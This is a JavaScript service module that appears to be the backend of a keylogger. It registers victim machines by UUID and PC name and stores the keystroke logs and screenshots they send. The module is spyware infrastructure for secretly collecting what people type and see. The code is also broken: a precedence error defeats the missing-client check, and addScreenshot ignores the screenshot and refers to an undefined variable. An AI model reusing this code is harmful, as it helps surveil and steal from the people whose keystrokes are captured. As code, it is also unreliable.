'use strict'

const Client = require('../models/Client')
const clientDao = require('../dao/clientDao')
const { sequelize } = require('../models/Client')
//const { now } = require('sequelize/types/lib/utils')

const clientService = {

    createOrUpdate: async function (req) {

        // Call the DAO to find if a user exists or not
        const client = await clientDao.findOneByUuid(req.uuid)

        // If he doesn't exist, then we create it
        if (!(client instanceof Client)) {
            return { isNew: true, data: await this.create(req) }
        }

        // If he does exist, then we update it
        return { isNew: false, data: await this.update(req) }
    },
    create: async function (req) {

        const client = await clientDao.insertOne({
            uuid: req.uuid,
            pcName: req.data.pcName
        })

        return client
    },
    update: async function (req) {

        const client = await clientDao.updateOne({
            uuid: req.uuid,
            pcName: req.data.pcName
        })

        return client
    },
    addKeylogs: async function (uuid, keylogsArray) {

        const client = await clientDao.findOneByUuid(uuid)

        // If he doesn't exist
        if ((!client instanceof Client)) {
            console.log("Pas de client")
            return { isAdded: false }
        }

        if (keylogsArray instanceof Array) {
            keylogsArray.forEach(keylogs => {
                clientDao.insertLogs(client.dataValues.id, keylogs)
            });
        }
        return { isAdded: true }
    },
    addScreenshot: async function (uuid, screenshot) {

        const client = await clientDao.findOneByUuid(uuid)

        // If he doesn't exist
        if ((!client instanceof Client)) {
            console.log("Pas de client")
            return { isAdded: false }
        }

        if (keylogsArray instanceof Array) {
            keylogsArray.forEach(keylogs => {
                clientDao.insertLogs(client.dataValues.id, keylogs)
            });
        }
        return { isAdded: true }
    }
}

module.exports = clientService